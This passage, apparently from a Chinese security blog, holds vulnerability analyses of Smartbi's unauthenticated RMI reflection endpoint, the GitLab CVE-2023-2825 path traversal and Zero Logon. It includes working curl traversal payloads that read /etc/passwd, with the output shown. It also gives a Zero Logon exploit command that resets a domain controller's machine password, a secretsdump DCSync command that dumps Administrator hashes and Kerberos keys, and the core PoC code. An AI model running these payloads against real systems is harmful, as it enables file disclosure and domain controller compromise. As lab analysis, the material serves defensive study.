params); RMIModule.getInstance().doRollback(); RMIModule.getInstance().doEndRequest(request); ... } } catch (Throwable th) { RMIModule.getInstance().doRollback(); RMIModule.getInstance().doEndRequest(request); throw th; } } RMIUtil.parseRMIInfo方法首先判断uri是否是/vision/RMIServlet，而后获取请求的className、methodName、params参数，并返回RMIInfo对象\npublic static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) { if (!\u0026#34;/vision/RMIServlet\u0026#34;.equals(request.getServletPath()) \u0026amp;\u0026amp; !forceParse) { return null; } RMIInfo info = getRMIInfoFromRequest(request); if (info != null) { return info; } String className = request.getParameter(\u0026#34;className\u0026#34;); String methodName = request.getParameter(\u0026#34;methodName\u0026#34;); String params = request.getParameter(SimpleReportBO.EL_PARAMS); if (StringUtil.isNullOrEmpty(className) \u0026amp;\u0026amp; StringUtil.isNullOrEmpty(methodName) \u0026amp;\u0026amp; StringUtil.isNullOrEmpty(params) \u0026amp;\u0026amp; request.getContentType() != null \u0026amp;\u0026amp; request.getContentType().startsWith(\u0026#34;multipart/form-data;\u0026#34;)) { DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try { List\u0026lt;FileItem\u0026gt; fileItems = upload.parseRequest(request); request.setAttribute(ATTR_KEY_UPLOAD_FILE_ITEMS, fileItems); for (FileItem fileItem : fileItems) { if (fileItem.isFormField()) { String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(\u0026#34;UTF-8\u0026#34;); if (\u0026#34;className\u0026#34;.equals(itemName)) { className = itemValue; } else if (\u0026#34;methodName\u0026#34;.equals(itemName)) { methodName = itemValue; } else if (SimpleReportBO.EL_PARAMS.equals(itemName)) { params = itemValue; } else if (\u0026#34;encode\u0026#34;.equals(itemName)) { encodeString = itemValue; } } } } catch (FileUploadException | UnsupportedEncodingException e) { LOG.error(e.getMessage(), e); } if (!StringUtil.isNullOrEmpty(encodeString)) { String[] decode = (String[]) CodeEntry.decode(encodeString, true); className = decode[0]; methodName = decode[1]; params = decode[2]; } } if (className == null \u0026amp;\u0026amp; methodName == null) { className = (String) request.getAttribute(\u0026#34;className\u0026#34;); methodName = (String) request.getAttribute(\u0026#34;methodName\u0026#34;); params = (String) request.getAttribute(SimpleReportBO.EL_PARAMS); } RMIInfo info2 = new RMIInfo(); info2.setClassName(className); info2.setMethodName(methodName); info2.setParams(params); request.setAttribute(ATTR_KEY_RMI_INFO, info2); return info2; } 而后调用processExecute方法，最终通过exceptionToNode方法通过反射调用了对应的方法\npublic String processExecute(HttpServletRequest request, String className, String methodName, String params) { Map\u0026lt;Integer, Integer\u0026gt; map; ClientService service = RMIModule.getInstance().getService(className); ClientService operationFailLogService = RMIModule.getInstance().getService(\u0026#34;OperationLogService\u0026#34;); String resultStr = null; JSONArray jsonParams = null; try { } catch (Exception ce) { if (Framework.getInstance().getExceptionHandler() != null) { return Framework.getInstance().getExceptionHandler().processException(ce); } if (className != null \u0026amp;\u0026amp; methodName != null) { try { ObjectNode resultNode = exceptionToNode(className, methodName, ce); resultStr = resultNode.toString(); String failResult = resultNode.has(\u0026#34;detail\u0026#34;) ? resultNode.get(\u0026#34;detail\u0026#34;).asText((String) null) : null; if (StringUtil.isNullOrEmpty(failResult)) { failResult = resultNode.get(\u0026#34;result\u0026#34;).asText(); } List\u0026lt;Object\u0026gt; listParams = null; if (0 != 0) { listParams = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; jsonParams.length(); i++) { listParams.add(jsonParams.get(i)); } } Object[] objParams = {className, methodName, listParams, failResult}; operationFailLogService.executeInternal(\u0026#34;addOperationFailLog\u0026#34;, objParams); } catch (Exception e) { LOG.error(e.getMessage(), e); } } } public Object executeInternal(String methodName, Object[] objParams) { try { Method method = StringUtil.isNullOrEmpty(methodName) ? null : this.methodList.get(methodName); if (method == null) { throw new SmartbiException(CommonErrorCode.METHOD_NAME_ERROR).setDetail(StringUtil.replaceHTML(methodName)); } Object result = method.invoke(this.module, objParams); return result; } catch (InvocationTargetException ex) { if (ex.getCause() instanceof SmartbiException) { 再来回顾一下补丁，补丁中说该漏洞是对钱一个漏洞的绕过，经过上面的分析可知*.stub接口无需身份验证，所以可以通过*.stub接口利用Smartbi内的反射调用到存在漏洞的类。\n在补丁中有如下，通过全局搜索类名DataSourceService便可知道漏洞代码。\n\u0026#34;PATCH_20221122\u0026#34;: { \u0026#34;desc\u0026#34;: \u0026#34;修复了 DB2 命令执行漏洞 (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_zh_TW\u0026#34;: \u0026#34;修復了 DB2 命令執行漏洞 (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;desc_en\u0026#34;: \u0026#34;Fixed a DB2 command execution vulnerability. (Patch.20221122 @2022-11-22)\u0026#34;, \u0026#34;urls\u0026#34;: [{ \u0026#34;url\u0026#34;: \u0026#34;/vision/RMIServlet\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnectionList\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] },{ \u0026#34;className\u0026#34;: \u0026#34;DataSourceService\u0026#34;, \u0026#34;methodName\u0026#34;: \u0026#34;testConnection\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;RejectRMIParamsStringsPatchRule\u0026#34;, \u0026#34;strings\u0026#34;: [\u0026#34;clientRerouteServerListJNDIName\u0026#34;] }] }] }, 该代码中的参数均为可控，故可以通过控制JDBC url的方式执行恶意代码，此时可以通过DB2执行代码。\npublic void testConnectionList(List\u0026lt;IDataSource\u0026gt; list) { for (IDataSource dataSource : list) { MetaDataServiceImpl.getInstance().testConnection(dataSource); } } public void testConnection(IDataSource dataSource) { int preIndex; ISystemConfig systemConfig; DataSource ds = new DataSource(); String url = dataSource.getUrl(); ds.setId(UUIDGenerator.generate()); ds.setName(dataSource.getName()); ds.setAlias(dataSource.getAlias()); ds.setDriver(dataSource.getDriver()); ds.setDesc(dataSource.getDesc()); ds.setDbCharset(dataSource.getDbCharset()); ds.setUrl(url); ds.setUser(dataSource.getUser()); ds.setDriverType(dataSource.getDriverType()); ds.setMaxConnection(dataSource.getMaxConnection()); ds.setValidationQuery(dataSource.getValidationQuery()); ds.setPassword(dataSource.getPassword()); ds.setTransactionIsolation(dataSource.getTransactionIsolation()); ds.setValidationQueryMethod(dataSource.getValidationQueryMethod()); ds.setAuthenticationType(dataSource.getAuthenticationType()); ds.setExtendProp(dataSource.getExtendProp()); ds.setDriverCatalog(dataSource.getDriverCatalog()); if (dataSource.getPassword() == null \u0026amp;\u0026amp; !StringUtil.isNullOrEmpty(dataSource.getId())) { DataSource dbDs = loadDataSource(dataSource.getId()); ds.setPassword(dbDs.getPassword()); } if (StringUtil.isNullOrEmpty(dataSource.getId()) \u0026amp;\u0026amp; ds.getDriverType() == DBType.HADOOP_HIVE \u0026amp;\u0026amp; (systemConfig = FreeQueryModule.getInstance().getSystemConfigService().getSystemConfig(\u0026#34;MPP_SSH_CONFIG\u0026#34;)) != null) { String longValue = systemConfig.getLongValue(); if (StringUtils.isNotBlank(longValue)) { JSONObject jsonObject = JSONObject.fromString(longValue); if (jsonObject.has(SFTPConstants.HIVE_PASSWORD)) { String pwd = jsonObject.getString(SFTPConstants.HIVE_PASSWORD); if (StringUtils.isNotBlank(pwd)) { ds.setPassword(pwd); } } } } Connection conn = null; try { try { conn = ConnectionPool.getInstance().getConnection(ds); if (conn == null) { throw new SmartbiException(CommonErrorCode.JDBC_DRIVER_ERROR).setDetail(ds.getDriver() + \u0026#34;:\u0026#34; + ds.getUrl()); } if (DBType.PRESTO == dataSource.getDriverType()) { PreparedStatement stat = JdbcUtil.prepareStatement(conn, \u0026#34;SELECT 1\u0026#34;, dataSource.getDriverType()); try { PreparedStatementWarp.executeQuery(stat, DBSQLUtil.createSQLLog(ds.getAlias(), SmartbiXDataSetUtil.OTHER, FreeQueryModule.getInstance().getStateModule(), \u0026#34;SELECT 1\u0026#34;)); } catch (Exception e) { if (e instanceof SmartbiException) { throw ((SmartbiException) e); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e).setDetail(StringUtil.getLanguageValue(\u0026#34;InvalidConnection\u0026#34;)); } } else if (DBType.CLICK_HOUSE == dataSource.getDriverType() \u0026amp;\u0026amp; (preIndex = url.indexOf(\u0026#34;clusterName=\u0026#34;)) \u0026gt; -1) { String clusterName = url.substring(preIndex + \u0026#34;clusterName=\u0026#34;.length()); int suffixIndex = clusterName.indexOf(\u0026#34;\u0026amp;\u0026#34;); if (suffixIndex \u0026gt; -1) { clusterName = clusterName.substring(0, suffixIndex); } if (!StringUtil.isNullOrEmpty(clusterName)) { String validSql = \u0026#34;drop table if exists t_testcluster on cluster \u0026#34; + clusterName; PreparedStatement stat2 = JdbcUtil.prepareStatement(conn, validSql, dataSource.getDriverType()); try { PreparedStatementWarp.executeQuery(stat2, DBSQLUtil.createSQLLog(ds.getAlias(), SmartbiXDataSetUtil.OTHER, FreeQueryModule.getInstance().getStateModule(), validSql)); } catch (Exception e2) { if (e2.getLocalizedMessage().indexOf(\u0026#34;Requested cluster \u0026#39;\u0026#34; + clusterName + \u0026#34;\u0026#39; not found\u0026#34;) \u0026gt; -1) { throw new SmartbiException(CommonErrorCode.CLICK_HOUSE_CLUSTER_NOT_FOUND, e2).setDetail(clusterName); } if (e2 instanceof SmartbiException) { throw ((SmartbiException) e2); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e2).setDetail(StringUtil.getLanguageValue(\u0026#34;InvalidConnection\u0026#34;)); } } } } catch (Exception e3) { if (e3 instanceof SmartbiException) { throw ((SmartbiException) e3); } String detail = SmartbiXDataSetUtil.OTHER; if (e3 instanceof ClassNotFoundException) { detail = StringUtil.getLanguageValue(\u0026#34;DBDriverNoFound\u0026#34;); } throw new SmartbiException(FreeQueryErrorCode.CONNECTION_POOL_NOT_INITIAL, e3).setDetail(detail + e3.getMessage()); } } finally { if (conn != null) { try { conn.close(); } catch (Throwable th) { Logger.getLogger(getClass()).debug(SmartbiXDataSetUtil.OTHER); } } if (!ds.getUrl().startsWith(\u0026#34;JNDI:\u0026#34;)) { ConnectionPool.getInstance().closePool(ds); } } } 题外话，我本身不懂Java那一套，只是按照粗浅的代码理解去分析漏洞，有机会去分析一下JNDI注入原理。\n参考链接\nhttps://www.smartbi.com.cn/patchinfo\nCreated at 2023-06-16T16:07:41+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/","title":"CVE-2023-2825 Gitlab 路径穿越漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 在GitLab 中，当一个附件存在于一个项目中，并且该项目在嵌套了至少五层的组内，攻击者才可以利用这个漏洞进行目录穿越，读取服务器上的文件。\n影响版本 GitLab 16.0.0\n环境搭建 用docker起环境\ndocker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 技术分析\u0026amp;调试 一开始以为是普通的目录穿越，先diff看怎么修的，注意到16.0.1新增了spec\\support\\shared_examples\\requests\\uploads_actions_shared_examples.rb 文件。\n根据该文件内容判断应该是这个漏洞的单元测试文件，没学过ruby，先把这段代码扔给ChatGPT看看\n# frozen_string_literal: true RSpec.shared_examples \u0026#39;uploads actions\u0026#39; do describe \u0026#34;GET #show\u0026#34; do context \u0026#39;with file traversal in filename parameter\u0026#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { \u0026#34;../../../../../../../../../Gemfile.lock\u0026#34; } let(:escaped_filename) { CGI.escape filename } it \u0026#39;responds with status 400\u0026#39; do # Check files do indeed exists upload_absolute_path = Pathname(upload.absolute_path) expect(upload_absolute_path).to be_exist attacked_file_path = upload_absolute_path.dirname.join(filename) expect(attacked_file_path).to be_exist # Need to escape, otherwise we get `ActionController::UrlGenerationError Exception: No route matches` get show_path.sub(File.basename(upload.path), escaped_filename) expect(response).to have_gitlab_http_status(:bad_request) end end end end ChatGPT回答：\n这段Ruby代码定义了一个RSpec共享示例，名为“uploads actions”，它包含一个测试用例。这个测试用例测试了在文件名参数中发生文件遍历攻击时服务器的响应行为。 在测试用例中，首先定义了两个变量：filename和escaped_filename。filename变量是一个字符串，它代表将被攻击的文件名。escaped_filename变量是对filename进行URL编码后的结果，这是为了避免请求URL中使用不安全的字符可能会导致意外的结果。 然后，该测试用例检查上传的文件是否存在，之后构造一个恶意URL请求来执行文件遍历攻击，请求一个非法文件。具体而言，它使用Pathname类来获取上传文件的绝对路径，然后使用File.basename和String#sub方法来构造恶意URL请求。最后，使用RSpec的expect语句来检查服务器的响应状态码是否为400（bad_request）。 总之，这个RSpec共享示例测试了服务器是否能够防止文件遍历攻击，并正确地处理恶意请求。 根据有限的知识结合ChatGPT回答，可以知道这段代码首先定义了目录穿越的payload：../../../../../../../../../Gemfile.lock 而后将其进行url编码并赋值给escaped_filename。\n之后将上传目录的路径和这个payload拼接并判断这个路径是否存在。之后通过String.sub函数将上传路径的文件名替换成了escaped_filename，并用RSpec 框架的get函数发起请求。\n结合该单元测试的注释，可以知道，大概payload如下\n/url/to/upload/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FGemfile%2Elock # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET 在通过官方文档知道如何通过API上传附件\ncurl --request POST --header \u0026#34;PRIVATE-TOKEN: \u0026lt;your_access_token\u0026gt;\u0026#34; \\ --form \u0026#34;file=@dk.png\u0026#34; \u0026#34;https://gitlab.example.com/api/v4/projects/5/uploads\u0026#34; https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file\n这里先用Administrator上传一个附件看看（已提前建好相应的组和项目）\n$ curl --request POST --header \u0026#34;PRIVATE-TOKEN: glpat-Py3rEGA_SPngPn-2LzsR\u0026#34; --form \u0026#34;file=@3.txt\u0026#34; \u0026#34;http://192.168.59.197/api/v4/projects/g1%2Fg2%2Fg3%2Fg4%2Fg5%2Fg6%2Fg7%2Fg8%2Fg9%2Fp4/uploads\u0026#34; {\u0026#34;alt\u0026#34;:\u0026#34;3.txt\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt\u0026#34;,\u0026#34;full_pat h\u0026#34;:\u0026#34;/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/3.tx t\u0026#34;,\u0026#34;markdown\u0026#34;:\u0026#34;[3.txt](/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt)\u0026#34;} 可以看到已经返回了一个url，不难看出和单元测试里面的注释的路径长得很像，这里用自己的payload替换3.txt\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2fpasswd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi n nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh 分析\n到现在有两个问题\n为什么要求payload需要经过url编码 为什么要12个穿越符才能到根目录 在哪个代码触发的漏洞 首先是第一个问题，GitLab架构为nginx ↔Workhorse↔puma，起初以为将目录穿越进行url编码是绕过nginx解析，举个例子，当访问/1/2/3/4/5/6/../../../index.php时nginx实际会访问/1/2/3/index.php，即会进行拼接然后访问，所以一开始判断的是将payload进行url编码绕过这个过程，而后和其他师傅讨论才发现，虽然将payload进行编码但nginx会将url里面url编码的部分进行解码然后拼接，所以url编码不是为了绕过nginx解析。在前面使用api上传文件时，文档特别强调了上传目标路径需要进行url编码，这里推测应该是GitLab内会进行url解码在进行处理。\n第二个问题为什么需要12个穿越符，经过测试发现文件实际上传在/var/opt/gitlab/gitlab-rails/uploads/@hashed 目录下，但在代码中使用的是/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/ 其中uploads软连接到了/var/opt/gitlab/gitlab-rails/uploads目录，在上传一个文件后，文件路径为/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a/34c2b7fc66dcfbfe0b65513260ad0510/3.txt 不难看出共有12层目录所以需要12个穿越符，在触发漏洞时url为/path/to/group/project/uploads/@hashed，结合绕过nginx解析，所以至少需要9个组才能有足够的嵌套层数绕过nginx的url解析。\n第三个问题，回到补丁对比，补丁主要在以下两个文件添加了防护目录穿越的代码，在show方法处对filename进行url解码而后调用 Gitlab::Utils.check_path_traversal!(params[:filename]) 检查url解码后的参数是否存在目录穿越。\napp\\uploaders\\object_storage.rb def retrieve_from_store!(identifier) Gitlab::Utils.check_path_traversal!(identifier) # We need to force assign the value of @filename so that we will still # get the original_filename in cases wherein the file points to a random generated # path format. This happens for direct uploaded files to final location. # # If we don\u0026#39;t set @filename value here, the result of uploader.filename (see ObjectStorage#filename) will result # to the value of uploader.file.filename which will then contain the random generated path. # The `identifier` variable contains the value of the `file` column which is the original_filename. # # In cases wherein we are not uploading to final location, it is still fine to set the # @filename with the `identifier` value because it still contains the original filename from the `file` column, # which is what we want in either case. @filename = identifier # rubocop: disable Gitlab/ModuleWithInstanceVariables super end private app\\controllers\\concerns\\uploads_actions.rb def show Gitlab::Utils.check_path_traversal!(params[:filename]) return render_404 unless uploader\u0026amp;.exists? ttl, directives = *cache_settings ttl ||= 0 directives ||= { private: true, must_revalidate: true } expires_in ttl, directives file_uploader = [uploader, *uploader.versions.values].find do |version| version.filename == params[:filename] end return render_404 unless file_uploader workhorse_set_content_type! send_upload(file_uploader, attachment: file_uploader.filename, disposition: content_disposition) end 再来看Gitlab::Utils.check_path_traversal函数，其定义在lib\\gitlab\\utils.rb\ndef check_path_traversal!(path) return unless path path = path.to_s if path.is_a?(Gitlab::HashedPath) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; unless path.is_a?(String) path = decode_path(path) path_regex = %r{(\\A(\\.{1,2})\\z|\\A\\.\\.[/\\\\]|[/\\\\]\\.\\.\\z|[/\\\\]\\.\\.[/\\\\]|\\n)} if path.match?(path_regex) logger.warn(message: \u0026#34;Potential path traversal attempt detected\u0026#34;, path: \u0026#34;#{path}\u0026#34;) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; end path end 这个函数接收一个路径，而后用正则表达式进行匹配，如果匹配到了则抛出PathTraversalAttackError 错误，把这段正则表达式给ChatGPT，给出了如下解释，所以代码调用这个函数可以检查是否存在恶意的目录穿越。\n这个正则表达式也是用来匹配文件路径字符串中的相对路径（如\u0026#34;./\u0026#34;、\u0026#34;../\u0026#34;等）的，它的含义与前一个问题中的正则表达式非常相似，只是使用了不同的语法来表示相同的含义。具体来说，这个正则表达式的含义如下： json \\A 匹配字符串的开头 (.{1,2}) 匹配一个或两个任意字符，并将其作为一个分组 \\z 匹配字符串的结尾 | 或 \\A..\\[/\\\\] 匹配以\u0026#34;../\u0026#34;开头的字符串 | 或 [/\\\\]..\\z 匹配以\u0026#34;/..\u0026#34;结尾的字符串 | 或 [/\\\\]..\\[/\\\\] 匹配\u0026#34;/../\u0026#34;或\u0026#34;\\..\\\u0026#34;这样以\u0026#34;/\u0026#34;或\u0026#34;\\\u0026#34;开头且以\u0026#34;/\u0026#34;或\u0026#34;\\\u0026#34;结尾的字符串 | 或 \\n 匹配换行符 ) 分组结束 其中，\\A、\\z和\\n分别代表字符串的开头、结尾和换行符，|表示或的关系，[/\\\\]用来匹配\u0026#34;\u0026#34;或\u0026#34;/\u0026#34;这两种目录分隔符，因为在不同的操作系统中，目录分隔符是不同的。 这个正则表达式的作用是匹配一个相对路径字符串，用来检测是否存在不合法的相对路径，例如路径中包含超出根目录的\u0026#34;../\u0026#34;或者\u0026#34;..\u0026#34;这样的字符串，或者以\u0026#34;../\u0026#34;开头或以\u0026#34;/..\u0026#34;结尾。如果匹配成功，说明该路径存在不合法的相对路径，需要进行处理或报错。 补丁还以下路径新增了文件，不难看出是在定义了module和upload对象，而后定义了一个字符串show_path并把它传给了config/routes/uploads.rb执行。\nspec\\requests\\uploads_controller_spec.rb # frozen_string_literal: true require \u0026#39;spec_helper\u0026#39; RSpec.describe UploadsController, feature_category: :shared do include WorkhorseHelpers it_behaves_like \u0026#39;uploads actions\u0026#39; do let_it_be(:model) { create(:personal_snippet, :public) } let_it_be(:upload) { create(:upload, :personal_snippet_upload, :with_file, model: model) } # See config/routes/uploads.rb let(:show_path) do \u0026#34;/uploads/-/system/#{model.model_name.singular}/#{model.to_param}/#{upload.secret}/#{File.basename(upload.path)}\u0026#34; end end end 在config/routes/uploads.rb中，定义了路由匹配规则用来处理上传文件和显示文件的请求，结合spec\\requests\\uploads_controller_spec.rb的内容可以知道应该是在处理路由get '-/system/:model/:id/:secret/:filename'时，将文件名传给uploads模块的show方法触发漏洞。\nconfig/routes/uploads.rb # frozen_string_literal: true scope path: :uploads do # Note attachments and User/Group/Project/Topic avatars get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: %r{note|user|group|project|projects\\/topic|achievements\\/achievement}, mounted_as: /avatar|attachment/, filename: %r{[^/]+} } # show uploads for models, snippets (notes) available for now get \u0026#39;-/system/:model/:id/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/, filename: %r{[^/]+} } # show temporary uploads get \u0026#39;-/system/temp/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { filename: %r{[^/]+} } # Appearance get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /appearance/, mounted_as: /logo|header_logo|pwa_icon|favicon/, filename: /.+/ }, as: \u0026#39;appearance_upload\u0026#39; # create uploads for models, snippets (notes) available for now post \u0026#39;:model\u0026#39;, to: \u0026#39;uploads#create\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/ }, as: \u0026#39;upload\u0026#39; post \u0026#39;:model/authorize\u0026#39;, to: \u0026#39;uploads#authorize\u0026#39;, constraints: { model: /personal_snippet|user/ } # Alert Metric Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /alert_management_metric_image/, mounted_as: /file/, filename: %r{[^/]+} }, as: \u0026#39;alert_metric_image_upload\u0026#39; # Abuse Reports Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /abuse_report/, mounted_as: /screenshot/, filename: %r{[^/]+} }, as: \u0026#39;abuse_report_upload\u0026#39; end # Redirect old note attachments path to new uploads path. get \u0026#34;files/note/:id/:filename\u0026#34;, to: redirect(\u0026#34;uploads/note/attachment/%{id}/%{filename}\u0026#34;), constraints: { filename: %r{[^/]+} } 坑点 组层数不够\n原先按照官方通告说的至少5层组嵌套，就只新建了5层，而后发送payload，一直报400，一度以为环境是16.0.1修复版本，而后发现是嵌套不够。\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/p1/uploads/dec19360ec8b52993908879181719de3/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%20 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;400 Bad Request\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 后来得到同事提示，需要至少9层才可以访问到根目录。\n穿越符不够\n经测试，至少需要12个穿越符../ 才能成功穿越到根目录\n小结\n本次漏洞分析有点事后诸葛亮，从已知的PoC推测触发的文件路径，但总算成功理解了整个触发文件流，坑点就是nginx解析导致需要足够的group才能穿越到根目录，分析这个漏洞的时候没学过ruby，依靠ChatGPT才能够理解某些代码。\nCreated at 2023-05-26T10:36:20+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/","title":"Zero Logon 分析","tags":[],"description":"","content":"基本信息 Netlogon协议认证过程： 影响版本 略\n环境搭建 win server 2012 技术分析\u0026amp;调试 利用 域环境使用Windows server 2012R2搭建，先用\r脚本重置域账户密码 python cve-2020-1472-exploit.py WIN2016 192.168.52.130 并抓取数据包 重置之后域账户的密码为空，对应hash为31d6cfe0d16ae931b73c59d7e0c089c0\n安装impacket：\npython3 -m pipx install impacket pipx ensurepath 使用impacket的secretsdump进行Dcsync，得到Administratr账户的NTLM hash secretsdump.py cqy.io/WIN2016\\$@WIN2016 -dc-ip 192.168.52.130 -just-dc-user cqy\\\\administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:668d503af91aefe071e37a16e885047b::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:8996ffd41ae52dd62a3c60007d078f10eb7cd3eb5d4b74c90791c8e47eba88cb Administrator:aes128-cts-hmac-sha1-96:a3a6d348e74cee613718c2f94d404fb6 Administrator:des-cbc-md5:f732d313b5e92585 [*] Cleaning up... PoC分析 关键代码是下面这个函数，参数rpc_con是DCERPC_v5对象，描述了rcp链接，\nfor attempt in range(0, MAX_ATTEMPTS): result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer) if result is None: print(\u0026#39;=\u0026#39;, end=\u0026#39;\u0026#39;, flush=True) else: break def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer): # Connect to the DC\u0026#39;s Netlogon service. # Use an all-zero challenge and credential. plaintext = b\u0026#39;\\x00\u0026#39; * 8 ciphertext = b\u0026#39;\\x00\u0026#39; * 8 # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. flags = 0x212fffff # Send challenge and authentication request. nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + \u0026#39;\\x00\u0026#39;, target_computer + \u0026#39;\\x00\u0026#39;, plaintext) try: server_auth = nrpc.hNetrServerAuthenticate3( rpc_con, dc_handle + \u0026#39;\\x00\u0026#39;, target_computer + \u0026#39;$\\x00\u0026#39;, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + \u0026#39;\\x00\u0026#39;, ciphertext, flags ) # It worked! assert server_auth[\u0026#39;ErrorCode\u0026#39;] == 0 return True except nrpc.DCERPCSessionError as ex: # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working. if ex.get_error_code() == 0xc0000022: return None else: fail(f\u0026#39;Unexpected error code from DC: {ex.get_error_code()}.\u0026#39;) except BaseException as ex: fail(f\u0026#39;Unexpected error: {ex}.\u0026#39;) 